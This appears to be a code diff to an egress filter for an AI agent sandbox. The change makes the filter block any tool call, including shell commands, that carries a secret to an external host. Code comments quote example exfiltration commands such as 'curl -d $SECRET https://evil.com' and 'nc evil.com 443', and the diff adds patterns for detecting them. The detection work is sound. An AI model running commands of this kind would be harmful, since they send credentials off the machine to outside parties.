@@ -45,6 +45,10 @@ from .tiers import capability
 _SECRET_RES = [re.compile(p) for p in SECRET_PATTERNS]
 _HOST_RE = re.compile(r"https?://([^/\s:]+)", re.IGNORECASE)
 _EMAIL_HOST_RE = re.compile(r"@([\w.-]+)")
+# A bare domain (no scheme) with a plausible TLD - catches `nc evil.com 443` or
+# `scp file user@host:` style destinations inside command arguments.
+_BARE_HOST_RE = re.compile(
+    r"\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,24})\b", re.IGNORECASE)
 _ZERO_WIDTH_RE = re.compile(r"[​‌‍⁠﻿­]")
 _B64_RE = re.compile(r"[A-Za-z0-9+/]{16,}={0,2}")
 _HEX_RE = re.compile(r"(?:[0-9a-fA-F]{2}){8,}")
@@ -106,6 +110,29 @@ def _hosts_in(value: str) -> list[str]:
             if tok:
                 hosts.append(tok.lower())
     return hosts
+
+
+def _hosts_in_text(text: str) -> list[str]:
+    """Hosts referenced anywhere in free text (URLs, bare domains, e-mails).
+
+    Used to spot an exfiltration destination embedded in a command line or other
+    non-address argument, e.g. ``curl -d @- https://evil.com/collect``.
+    """
+    hosts: list[str] = []
+    for m in _HOST_RE.findall(text):
+        hosts.append(m.lower())
+    for m in _EMAIL_HOST_RE.findall(text):
+        hosts.append(m.lower())
+    for m in _BARE_HOST_RE.findall(text):
+        hosts.append(m.lower())
+    seen: set[str] = set()
+    out: list[str] = []
+    for h in hosts:
+        h = h.strip(".,;:'\"()[]{}<>")
+        if h and h not in seen:
+            seen.add(h)
+            out.append(h)
+    return out
 
 
 def _extract_destinations(tool_call: ToolCall) -> list[str]:
@@ -189,8 +216,24 @@ class EgressFilter:
 
     # -- main inspection ----------------------------------------------- #
     def inspect(self, tier: SandboxTier, tool_call: ToolCall) -> EgressDecision:
-        # Non-egress tools have no exfiltration surface here.
         if not self.config.is_egress_tool(tool_call.name):
+            # A tool outside the declared egress set can still move data off-box:
+            # `exec_shell` running `curl -d $SECRET https://evil.com` is an
+            # exfiltration whatever the tool is named.  Rather than trust the
+            # tool list, apply the universal rule - a payload carrying a secret
+            # AND naming an external destination is an exfiltration attempt.
+            # Requiring BOTH keeps this precise: a shell command with no secret,
+            # or a secret with no external destination, is left alone.
+            payload = _payload_text(tool_call)
+            if any(r.search(payload) for r in self._secret_res):
+                external = [h for h in _hosts_in_text(payload)
+                            if not self.is_internal(h)]
+                if external:
+                    return EgressDecision(
+                        False,
+                        f"tool '{tool_call.name}' carries a secret to external "
+                        f"destination '{external[0]}'",
+                        is_exfil_attempt=True, destination=external[0])
             return EgressDecision(True, "not an egress tool")
 
         cap = self.config.tier_caps.get(tier) or capability(tier)
